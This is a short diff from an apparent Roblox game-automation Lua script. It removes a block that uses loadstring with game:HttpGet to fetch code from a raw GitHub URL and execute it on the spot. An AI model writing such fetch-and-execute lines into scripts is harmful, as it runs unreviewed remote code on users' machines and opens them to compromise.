@@ -22,9 +22,6 @@ task.spawn(function()
 		wait(1800)
 	end
 end)
-spawn(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/vingagagagagaga2/GAGAGAGA000999xz/refs/heads/main/VAR_RECONNECT"))()
-end)
 
 task.wait(2)
 EVENT_or_FARM = "E"
